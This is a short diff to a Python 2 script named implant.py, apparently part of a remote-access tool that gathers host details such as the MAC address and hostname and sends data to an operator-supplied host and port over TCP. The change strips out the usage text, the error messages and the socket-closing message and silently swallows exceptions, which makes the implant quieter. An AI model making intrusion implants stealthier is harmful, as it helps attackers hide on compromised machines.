@@ -9,10 +9,6 @@ import uuid
 
 from crispy.network.client_types import CrispyTCPClient
 
-def usage():
-    print "usage: implant.py host:port"
-    sys.exit(0)
-
 def enum():
     macaddr = None
     hostname = None
@@ -80,8 +76,6 @@ def enum():
 def main():
     if len(sys.argv) == 2:
 	host, port = sys.argv[1].split(":")
-    else:
-    	usage()
     
     try:
 	sock = CrispyTCPClient().connect(host, port)
@@ -92,10 +86,9 @@ def main():
             sock.send(data)
     except KeyboardInterrupt: 
 	pass
-    except Exception as e:
-	print "[!] Error connecting to {}:{} because of {}".format(host, port, e)
+    except:
+        pass
     finally:
-	print "closing implant socket"
 	sock.close()
 
 if __name__ == "__main__":
